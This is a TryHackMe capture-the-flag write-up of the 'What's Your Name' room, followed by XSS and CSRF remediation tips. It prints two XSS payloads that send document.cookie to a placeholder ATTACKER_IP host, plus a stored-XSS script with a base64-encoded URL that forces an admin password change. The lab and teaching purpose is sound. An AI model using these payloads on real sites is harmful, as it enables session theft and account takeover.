**What’s Your Name — TryHackMe — Detailed Writeup**

ABOUT ME

I'm Sarath Dev. R, a cybersecurity enthusiast focused on web application security, penetration testing, and real-world offensive techniques. I'm currently building hands-on skills through platforms like TryHackMe and developing custom tools for ethical hacking and red teaming.

Connect with me on LinkedIn (www.linkedin.com/in/sarath-dev-r-b7a63331a) to follow my journey or collaborate on security-focused projects.

In this writeup, I document my process and methodology for the TryHackMe whats your name? room. This exercise shows how I used different injection techniques to take control of a web application.

As you read through this account, think about how you can protect your own web applications from these types of attacks. The goal is to understand how these attacks work and learn how to prevent them.


This article will talk about how to solve a medium level “What’s Your Name” room on #TryHackMe. Besides that, I’ll add quick tips for preventing the vulnerabilities I discovered at the end.

◈ ENUURATION

As usual, the initial step was scanning open ports of the target.

![image](https://github.com/user-attachments/assets/ae017eca-5c40-4569-9b48-e6090fbdb446)

3 ports were open — 22, 80, 8081.

![image](https://github.com/user-attachments/assets/e2b02cc6-5fda-42e8-8486-897263cc2c53)

I targeted port 80 and fuzzed for disclosing hidden directories and files on port 80.

![image](https://github.com/user-attachments/assets/bbfd4b3f-daa5-46ed-9cf2-e0edeb2f67ce)

I also fuzzed public directory:

![image](https://github.com/user-attachments/assets/b1d0c7ff-ff22-4e47-b8ca-1ac68d8f97f3)

Continued from fuzzing /public/html:

![image](https://github.com/user-attachments/assets/5eea17b2-48b5-4b1a-90eb-6b0e02fec405)

Lastly, fuzzed /api directory:

![image](https://github.com/user-attachments/assets/fe07fd28-b332-4506-a3bb-c36d59dc4155)

The website has a login page:

![image](https://github.com/user-attachments/assets/443d159a-2792-4f85-a17f-242b049e444d)

The website forwards me to login.worldwap.thm. Here, I also tried to fuzz directories and files:

![image](https://github.com/user-attachments/assets/5c134668-db9c-4deb-a421-81cfb5ca3ca1)

Lastly, I fuzzed hidden directories and files on port 8081.

![image](https://github.com/user-attachments/assets/6132f970-8ad5-4224-9a34-1db760d6880d)

◈ MODERATOR ACCESS VIA XSS

The website has a register page, so I gave a shot.

![image](https://github.com/user-attachments/assets/2541f61c-cce2-4a86-8abf-d89f0de3ec70)

![image](https://github.com/user-attachments/assets/4fe96f75-60ab-449f-99b6-4a78b1435e58)

![image](https://github.com/user-attachments/assets/d91794ac-c8be-4e5f-ab36-30ae35b6339a)

But returned the following error. Page said that I have to visit the domain named login.worldwap.thm.

![image](https://github.com/user-attachments/assets/5d1f2387-deb9-4a88-b8de-17a5eac39e93)

![image](https://github.com/user-attachments/assets/f75091bb-9cde-4fac-8192-c61bee1b9d77)

The same error returned by the website.

At this point, I tried everything, checked page sources, registered several times, searched for valid credentials. But I was missing a hint, the creator left a message for me on the register page.

![image](https://github.com/user-attachments/assets/aa8a37e0-7782-4fe5-bbd4-e235957f2ba0)

The message said, “Your details will be reviewed by the site moderator.”. It means, I have 2 options:

1. I have to find a way to make the moderator review the account that I registered.

2. I have to find a way to get access as a moderator.

Unfortunately, the first one wasn’t a good idea, because I didn’t know how the review flow was working on the website. I have to follow the first option.

To gain access as a moderator, I decided to steal the moderator’s cookie, why? Because when I checked the cookie of my current session, I saw the value of the HttpOnly flag is false. This means, it was possible to steal the moderator’s cookie via XSS, if inputs in the register page was vulnerable.

![image](https://github.com/user-attachments/assets/3bd4974f-ca32-43af-8059-02f5c957ad6d)

For getting moderator’s cookie, I used script tag with window.location method.

PAYLOAD: "<script>window.location=’http://ATTACKER_IP:PORT/?’+document.cookie;</script>"

Or you can use img iframe HTML tags with event handlers like onerror, onbeforescriptexecute, etc.

I tried with both img and script tags.

First, started listener on port 4444, where the website have to send the GET request with cookie.

![image](https://github.com/user-attachments/assets/87dc8a19-1bca-4779-a3ac-04e3e7b0513a)

Adding the payload in Email input:

![image](https://github.com/user-attachments/assets/144aafa9-8afe-4b0e-a9e6-a7d7eeafcc8c)

![image](https://github.com/user-attachments/assets/74c4b498-cdab-47ff-8ede-e759a0ebfb09)

And I got the cookie.

Another example with img tag:

![image](https://github.com/user-attachments/assets/aa211feb-af4b-4c10-a438-424f88189a16)

Added the payload to the name input:

"<img src=x onerror=”window.location=’http://ATTACKER_IP:PORT/?’+document.cookie;” />"

![image](https://github.com/user-attachments/assets/e81a591c-e78e-44f1-b1e4-7114f54d75a7)

![image](https://github.com/user-attachments/assets/4afbabab-c842-4301-b5f2-9317136a9b78)

Again, I got the result.

On this page, username and password inputs weren’t worked for me because of input size limitations.

After getting the cookie, I went to the login.worldwap.thm page, because of the message on the register page.

![image](https://github.com/user-attachments/assets/785f820d-3ddf-469c-842a-3f4320569efb)

After swapping the cookie, I refreshed the page.

![image](https://github.com/user-attachments/assets/8f44e1bd-b6c3-4763-85dd-d771be079187)

And here was the moderator profile, also I got the answer of the room’s first question.

◈ GETTING ADMIN BOT'S COOKIE

After getting access to the moderator account, I surfed between the tabs to find out a way to log in as an admin.

Actually, it has 2 ways:

3.1. Changing admin’s password via CSRF

![image](https://github.com/user-attachments/assets/a41de752-5d67-406a-a2c8-185eba4d7c23)

On the chat page, I found a vulnerable Stored XSS input.

![image](https://github.com/user-attachments/assets/8f2d18fd-f565-4efe-8590-645f2a0d3fae)

Again, I thought it was possible to get the admin’s token, but it didn’t work for me.

![image](https://github.com/user-attachments/assets/fd2f90c5-9145-4459-88c2-c19b282e0830)

![image](https://github.com/user-attachments/assets/998bb831-f422-40db-8df5-9405a33c6039)

Again, I checked the pages and found changepassword feature.

![image](https://github.com/user-attachments/assets/e19ce7ae-440e-4260-a2b5-f824ee685a93)

I tried to change the password, but the website gave me a message that it was only available for admin.

After some time, I remembered a section from the CSRFv2 room. It was talking about getting access as a victim by making a victim change its password via CSRF.

I copied the payload and made some modifications.

"<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', atob('aHR0cDovL2xvZ2luLndvcmxkd2FwLnRobS9jaGFuZ2VfcGFzc3dvcmQucGhw'), true);
xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.onreadystatechange = function () {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
alert("Action executed!");
}
};
xhr.send('action=execute&new_password=admin123');
</script>"

Basically, this script made a POST request to the base64 encoded URL I added below and adds admin123 to the new_password input. If the response was 200 OK, then alert will be displayed in the page.

http://login.worldwap.thm/change_password.php

Then, I pasted it to the chat message bar, and fortunately, it worked.

![image](https://github.com/user-attachments/assets/7f6db26b-8062-4fac-84b9-b29218f05009)

![image](https://github.com/user-attachments/assets/e96b4bf5-ccae-4bf3-92c8-b68922f6345c)

Password was changed, and it was time to log in as an admin.

![image](https://github.com/user-attachments/assets/b5d522db-6b9e-4a4b-ae97-9546f5f847cc)

![image](https://github.com/user-attachments/assets/f2df675f-bfa2-45f2-bbf9-b46c67b64361)

Here I got access as an admin, and the answer of the second question of the room.

3.2. Read admin.py under login.worldwap.thm

Because of the chatbot I found on the login.worldwap.thm, I thought maybe fuzzing with py extension could be a great way to find out how chat page was working.

![image](https://github.com/user-attachments/assets/0e256d77-469b-44d8-a746-55f36e7d97b9)

Of course, I got admin.py and test.py. I read both and found hardcoded credentials.

![image](https://github.com/user-attachments/assets/8786bc8b-fa92-469d-8bfc-a79c015afcad)

![image](https://github.com/user-attachments/assets/11042667-24c0-46db-bc0d-adb683d294d8)

◈ VULNERABILITY AND REMEDIATION

4.1. XSS
Validate Input — Accept only expected input formats.
Sanitize and Filter HTML — Use libraries to clean user HTML.
Escape Output — Encode data as HTML or URL before inserting into HTML, JS, or URLs.
Set Content Security Policy (CSP) — Restrict sources of executable scripts.
HTTPOnly Cookies — Prevent JS from accessing session cookies.
4.2. CSRF
Use CSRF Tokens — Generate a unique token per user/session and validate it on requests.
SameSite Cookies — Set SameSite=Strict or Lax on cookies to block cross-origin sending requests.
Check Referer/Origin Headers — Validate request headers to confirm the origin.
Require Re-authentication — For critical actions, ask the user to re-enter their password.

*THANK YOU ALL**









































